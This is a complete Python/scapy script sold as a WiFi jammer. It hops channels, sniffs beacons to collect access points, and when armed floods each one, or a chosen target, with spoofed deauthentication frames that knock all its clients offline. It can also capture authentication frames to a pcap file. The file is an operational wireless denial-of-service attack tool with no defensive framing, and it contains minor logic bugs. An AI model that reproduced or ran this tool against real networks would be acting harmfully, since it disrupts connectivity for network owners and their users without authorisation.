#!/bin/python3
import argparse
import threading
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Elt
from scapy.utils import PcapWriter
from scapy.volatile import RandMAC
from scapy.sendrecv import sniff, sendp
from subprocess import Popen
from time import sleep

global AP_list
global ignore_AP
ignore_AP = []
AP_list = []

parser = argparse.ArgumentParser()
group = parser.add_mutually_exclusive_group()

parser.add_argument('interface', action='store', help='Sets the interface to use for sending and receiving')

group.add_argument('-l', '--ignore-list', dest='list', action='store', type=list, help='Ignore APs given by command line input (each MAC or SSID separated by spaces)')
group.add_argument('-f', '--ignore-file', dest='file', action='store', type=str, help='Ignore APs from this file (each MAC or SSID separated by newlines)')
group.add_argument('-t', '--target-AP', dest='target', action='store', type=str, help='Specifically target a single choice AP (by MAC or SSID')

parser.add_argument('-o', '--output', dest='output', action='store', type=str, help='File to write captured Auth Frames to (will only jam if not set)')
parser.add_argument('-v', '--verbose', dest='verbose', action='store_true', help='Enable verbose logging', default=False)
parser.add_argument('-c', '--channel', dest='channels', action='store', type=list, help='Channels to hop on (default is 1-11)', default=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11])
parser.add_argument('-a', '--arm', dest='arm', action='store_true', help='Arm the WiFi jammer (will simply sniff beacons if not armed)', default=False)

args = parser.parse_args()

if args.verbose == True:
	def verboseOutput(status, output, *details):
		if status == 1:
			statement = "\t[*] "
		elif status == 0:
			statement = "\t[ ] "
		elif status == 2:
			statement = "\t\t"
		statement += output
		if details:
			for x in details:
				statement += "\n\t\t\t" + x
		print(statement)
else:
	def verboseOutput(status, output, *details):
		return None

if args.list != None:
	ignore_AP += args.list
elif args.file != None:
	with open(args.file, 'r') as file:
		ignore_AP += file.readlines()

if args.output:
	output = PcapWriter(args.output, append=True)

def changeChannel(iface, channel):
	global current_channel
	current_channel = str(channel)
	command = ['iwconfig', iface, 'channel', current_channel]
	Popen(command, shell=False)

def channelHop(iface, channels):
	while True:
		for channel in channels:
			changeChannel(iface, channel)
			sleep(0.1)

def jammer():
	while True:
		if len(AP_list) != 0:
			for AP in AP_list:
				verboseOutput(1, f'De-Authenticating All Clients on AP {AP}')
				DeAuth_Frame = RadioTap()/Dot11(addr1 = RandMAC(), addr2 = AP, addr3 = AP)/Dot11Deauth(reason=2)
				sendp(DeAuth_Frame, verbose=False)

def packetHandler(packet):
	if packet.haslayer(Dot11):
		if packet.type == 0:
			if packet.subtype == 8:
				if args.target != None:
					if packet.addr2 == args.target or bytes.decode(packet[Dot11Elt].info) == args.target:
						AP_list.append(packet.addr2)
						verboseOutput(1, f'Target found: MAC = {packet.addr2} SSID = {packet[Dot11Elt].info} CH = {current_channel}')
				elif packet.addr2 not in ignore_AP or bytes.decode(packet[Dot11Elt].info) not in ignore_AP:
					if packet.addr2 not in AP_list:
						AP_list.append(packet.addr2)
						verboseOutput(1, f'Access Point Found: MAC = {packet.addr2} SSID = {packet[Dot11Elt].info} CH = {current_channel}')
			elif packet.subtype == 11:
				if output:
					output.write(packet)
					verboseOutput(1, f'Authentication Frame Found for AP {packet.addr2}')

channelHopper = threading.Thread(target = channelHop, args=(args.interface, args.channels))
beaconSniffer = threading.Thread(target = sniff, kwargs = dict(prn=packetHandler, iface=args.interface))
jammer = threading.Thread(target = jammer)

channelHopper.start()
beaconSniffer.start()
if args.arm == True:
	jammer.start()